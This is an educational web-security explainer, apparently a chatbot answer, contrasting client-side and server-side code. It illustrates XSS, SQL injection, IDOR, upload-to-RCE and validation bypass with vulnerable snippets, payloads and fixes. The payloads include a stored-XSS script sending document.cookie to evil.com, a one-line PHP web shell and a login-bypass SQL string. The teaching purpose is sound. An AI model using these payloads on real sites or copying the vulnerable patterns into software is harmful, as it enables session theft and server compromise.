# Client-Side-vs-Server-Side
Here’s a **clear, practical breakdown of Client-Side vs Server-Side**—with examples, security implications, and how they work together.

---

## 🌐 Client-Side (Front-End)

![Image](https://www.ionos.com/digitalguide/fileadmin/DigitalGuide/Screenshots_2022/Client-side-rendering-diagram.png)

![Image](https://images.prismic.io/prismic-main/Zi_gXN3JpQ5PTP9S_CSR.png?auto=format%2Ccompress)

![Image](https://blog.logrocket.com/wp-content/uploads/2018/09/image13.jpg)

### 📍 What it is

Everything that runs **in the user’s browser**.

### 🧩 Technologies

* **HTML** – structure
* **CSS** – styling
* **JavaScript** – logic & interaction
* Frameworks: **React, Vue, Angular**

### ⚙️ What it does

* Renders UI (buttons, forms, animations)
* Handles user interactions (clicks, typing)
* Performs basic validation (e.g., required fields)
* Makes requests to the server (AJAX / Fetch)

### ✅ Pros

* Fast UI responses
* Reduces server load
* Better user experience

### ❌ Cons

* **Untrusted** (user can modify JS)
* Cannot securely store secrets
* Easy to bypass validations

### 🔐 Security risks

* DOM XSS
* Client-side validation bypass
* Insecure JavaScript logic
* `innerHTML`, `document.write`, `eval` misuse

---

## 🖥️ Server-Side (Back-End)

![Image](https://www.researchgate.net/publication/254463856/figure/fig2/AS%3A297991807225860%401448058191264/Server-Side-Architecture.png)

![Image](https://media.geeksforgeeks.org/wp-content/uploads/20250705152348042640/Request-and-Response-Cycle.webp)

![Image](https://www.researchgate.net/publication/350846320/figure/fig2/AS%3A1080292240568349%401634573149464/Server-side-database-ER-diagram.jpg)

### 📍 What it is

Code that runs on the **web server**, not visible to users.

### 🧩 Technologies

* Languages: **PHP, Python, Node.js, Java, Go**
* Frameworks: **Django, Express, Laravel, Spring**
* Databases: **MySQL, PostgreSQL, MongoDB**

### ⚙️ What it does

* Authentication & authorization
* Business logic
* Database access
* Input validation & sanitization
* File handling
* API responses

### ✅ Pros

* **Trusted & secure**
* Can protect secrets (API keys, DB creds)
* Enforces real validation and access control

### ❌ Cons

* Higher server load
* Slower UI if poorly optimized

### 🔐 Security risks

* SQL Injection
* Command Injection
* Server-side XSS
* File upload vulnerabilities
* SSRF, IDOR

---

## 🔄 How Client & Server Work Together

![Image](https://images.openai.com/static-rsc-3/F_t6Nxag66GwUrJZTGgwVAZYVlMwBld4V12XLRJmjRC-om8fVkl1KiBpzM1fOFw_xb0QMdf0Eixfl6qkn3rrWHBLLLBDMFd-s2UDimSvxNM)

![Image](https://media.geeksforgeeks.org/wp-content/uploads/20250705152348042640/Request-and-Response-Cycle.webp)

![Image](https://miro.medium.com/0%2AA1QeFh9TAzX43Jud.png)

### 🔁 Flow example

1. User fills a form (Client)
2. JavaScript sends request (`fetch`)
3. Server validates & processes data
4. Server queries database
5. Server returns response (JSON/HTML)
6. Browser updates UI

---

## 🧠 Key Differences (Quick Table)

| Aspect          | Client-Side | Server-Side   |
| --------------- | ----------- | ------------- |
| Runs on         | Browser     | Server        |
| Visible to user | Yes         | No            |
| Trusted         | ❌ No        | ✅ Yes         |
| Access database | ❌           | ✅             |
| Validation      | Weak        | Strong        |
| Security role   | UI safety   | Core security |

---

## 🛡️ Security Rule (Very Important)

> **Never trust client-side validation alone.**
> Everything must be **validated again on the server**.

---

## 🐞 Bug Bounty / Pentest Angle (Based on your interest)

* **Client-side focus**:

  * DOM XSS
  * JS logic flaws
  * Hidden parameters
* **Server-side focus**:

  * SQLi, SSTI
  * Auth bypass
  * File upload
  * IDOR


---

## 🔴 1. DOM-Based XSS (Client-Side)

![Image](https://miro.medium.com/1%2AyuRkBR6YroYLCGpka9KdRA.png)

![Image](https://www.datocms-assets.com/85623/1762754967-dom-based-xss-via-innerhtml-sink.png?auto=format)

![Image](https://miro.medium.com/v2/resize%3Afit%3A786/1%2AyuRkBR6YroYLCGpka9KdRA.png)

### ❌ Vulnerable JavaScript

```js
const q = new URLSearchParams(location.search).get("q");
document.getElementById("output").innerHTML = q;
```

### 🎯 Attack URL

```
https://victim.com/search?q=<img src=x onerror=alert(1)>
```

### 💥 What happens

* Payload is **never sent to server**
* Browser executes attacker input directly
* JavaScript runs in victim’s session

### 🧠 Real impact

* Steal cookies
* Account takeover
* Credential phishing

### 🛡️ Fix

```js
element.textContent = q;
```

---

## 🔴 2. Reflected XSS (Server-Side)

![Image](https://www.imperva.com/learn/wp-content/uploads/sites/13/2016/03/reflected-cross-site-scripting-xss-attacks.png)

![Image](https://portswigger.net/support/images/methodology_attacking_users_xss_reflected_5.png)

![Image](https://www.cloudflare.com/img/learning/security/threats/cross-site-scripting/xss-attack.png)

### ❌ Vulnerable PHP

```php
echo "Welcome " . $_GET['name'];
```

### 🎯 Payload

```
https://site.com/?name=<script>alert(1)</script>
```

### 💥 What happens

* Server reflects input in HTML
* Browser executes injected JS

### 🧠 Seen in:

* Login error messages
* Search pages
* 404 handlers

### 🛡️ Fix

```php
echo htmlspecialchars($_GET['name'], ENT_QUOTES);
```

---

## 🔴 3. Stored XSS (Persistent)

![Image](https://www.imperva.com/learn/wp-content/uploads/sites/13/2019/01/sorted-XSS.png)

![Image](https://labsadmin.detectify.com/app/uploads/2017/01/html_comment_box3.jpg)

![Image](https://www.cloudflare.com/img/learning/security/threats/cross-site-scripting/xss-attack.png)

### ❌ Scenario

Comment stored in DB:

```html
<script>fetch('https://evil.com/c?='+document.cookie)</script>
```

### 💥 What happens

* Stored in database
* Executes for **every user**
* Often hits admins

### 🧠 Real-world targets

* Blog comments
* Chat systems
* Support tickets

### 🛡️ Fix

* Output encoding
* HTML sanitization
* CSP headers

---

## 🔴 4. SQL Injection (Server-Side)

![Image](https://portswigger.net/support/images/owasp_injection_10.png)

![Image](https://teckk2.github.io/assets/images/Web%20Pentest/A1/100.png)

![Image](https://whatismyipaddress.com/wp-content/uploads/37.jpg)

### ❌ Vulnerable Query

```sql
SELECT * FROM users WHERE username='$u' AND password='$p';
```

### 🎯 Payload

```
username=admin'-- 
password=anything
```

### 💥 What happens

* Password check commented out
* Login bypass

### 🧠 Real impact

* Full database dump
* Admin access
* Data breach

### 🛡️ Fix

```sql
Prepared Statements / Parameterized Queries
```

---

## 🔴 5. IDOR (Broken Access Control)

![Image](https://miro.medium.com/v2/resize%3Afit%3A1400/1%2Aj8licN2V1DOxeu_x7tEyng.jpeg)

![Image](https://sucuri.net/wp-content/uploads/2023/12/image02-jpg.webp)

![Image](https://cdn.prod.website-files.com/5ff66329429d880392f6cba2/6348192f8e2b1916df69dc17_464.3-min.jpg)

### ❌ Request

```
GET /api/user/profile?id=102
```

### 🎯 Attack

```
GET /api/user/profile?id=101
```

### 💥 What happens

* No ownership check
* Attacker views another user’s data

### 🧠 Seen in

* Invoices
* Profile pages
* File downloads

### 🛡️ Fix

```text
Verify object ownership on server
```

---

## 🔴 6. File Upload → RCE

![Image](https://www.vaadata.com/blog/wp-content/uploads/2022/03/RCE_vulnerability.png)

![Image](https://www.imperva.com/learn/wp-content/uploads/sites/13/2021/10/web-shell.png)

![Image](https://appcheck-ng.com/wp-content/uploads/File-Upload-Vuln-Pic-4.png)

### ❌ Weak Validation

* Only checks extension
* Uploads to web-root

### 🎯 Payload

```php
<?php system($_GET['cmd']); ?>
```

Uploaded as:

```
shell.php.jpg
```

### 💥 Result

```
https://site.com/uploads/shell.php.jpg?cmd=id
```

### 🛡️ Fix

* MIME validation
* Random filenames
* No execution permission

---

## 🔴 7. Client-Side Validation Bypass

### ❌ HTML

```html
<input type="number" max="5">
```

### 🎯 Attack

```http
POST /order
quantity=999
```

### 💥 What happens

* Server trusts client
* Logic abused

### 🛡️ Fix

> **Validate everything again on server**

---

## 🔥 Summary: Attacker Mindset

| Area           | Common Exploit         |
| -------------- | ---------------------- |
| Client-side    | DOM XSS, logic bypass  |
| Server-side    | SQLi, Stored XSS, IDOR |
| Trust boundary | Client ≠ Trusted       |
| Root cause     | Missing validation     |

---



